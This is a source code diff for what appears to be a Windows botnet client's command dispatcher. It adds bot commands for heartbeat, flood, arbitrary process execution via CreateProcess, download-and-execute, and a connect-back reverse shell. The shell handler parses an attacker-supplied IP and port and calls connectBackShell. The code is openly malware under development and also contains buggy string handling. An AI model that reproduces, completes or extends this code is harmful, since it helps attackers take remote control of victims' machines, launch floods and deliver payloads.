@@ -1,6 +1,8 @@
 #include "messages.h"
 #include "httpclient.h"
+#include "reverseshell.h"
 #include "install.h"
+#include "helper.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -14,6 +16,22 @@ struct commandList {
 	int length;
 	int(*function)(char*);
 };
+
+static struct commandList commands[64];
+static int cmdCount = 0;
+
+#define CREATE_COMMAND(str, func) \
+	commands[cmdCount].length = strlen(str); \
+	commands[cmdCount].command = (char*)malloc(sizeof(char)*commands[cmdCount].length); \
+	strcpy(commands[cmdCount].command, str); \
+	commands[cmdCount++].function = *func; \
+
+// Create our macros
+#define HEARTBEAT "heartbeat"
+#define FLOOD "flood"
+#define SYSTEM "system"
+#define DOWNLOADANDEXECUTE "downloadandexecute"
+#define SHELL "shell"
 
 int heartbeat(char * buf)
 {
@@ -34,46 +52,42 @@ int flood(char * buf)
 int systemCommand(char * buf)
 {
 	// pull out our execute command
-	char * path = strstr(buf, "system ");
-	if (path != NULL)
-	{
-		PROCESS_INFORMATION ProcessInfo;
-		STARTUPINFO StartupInfo;
-		ZeroMemory(&StartupInfo, sizeof(StartupInfo));
-		StartupInfo.cb = sizeof StartupInfo;
-		CreateProcess(buf+7, NULL,
-			NULL, NULL, FALSE, 0, NULL,
-			NULL, &StartupInfo, &ProcessInfo);
-	}
+	char * systemPath = buf + strlen(SYSTEM + 2);
+	PROCESS_INFORMATION ProcessInfo;
+	STARTUPINFO StartupInfo;
+	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
+	StartupInfo.cb = sizeof StartupInfo;
+	CreateProcess(systemPath, NULL,
+		NULL, NULL, FALSE, 0, NULL,
+		NULL, &StartupInfo, &ProcessInfo);
 	return 0;
 }
 
 int downloadAndExecuteCommand(char * buf)
 {
+	// pull out our execute command
+	char * downloadUrl = buf + strlen(DOWNLOADANDEXECUTE) + 1;
 	return 0;
 }
 
 int shell(char * buf)
 {
 	// connect-back shell (client based, encrypted)
+	char reverseIp[1024];
+	strncpy(reverseIp, buf + strlen(SHELL)+1, 1024);
+	char * tmp = strstr(reverseIp, " ");
+	if (tmp == NULL)
+	{
+		return -1;
+	}
+	*tmp = '\0';
+	
+	char reversePort[16];
+	strncpy(reversePort, tmp + 1, 16);
+
+	connectBackShell(reverseIp, reversePort);
 	return 0;
 }
-
-static struct commandList commands[64];
-static int cmdCount = 0;
-
-#define CREATE_COMMAND(str, func) \
-	commands[cmdCount].length = strlen(str); \
-	commands[cmdCount].command = (char*)malloc(sizeof(char)*commands[cmdCount].length); \
-	strcpy(commands[cmdCount].command, str); \
-	commands[cmdCount++].function = *func; \
-
-// Create our macros
-#define HEARTBEAT "heartbeat"
-#define FLOOD "flood"
-#define SYSTEM "system"
-#define DOWNLOADANDEXECUTE "downloadandexecute"
-#define SHELL "shell"
 
 // Valid messages
 int initMessages()
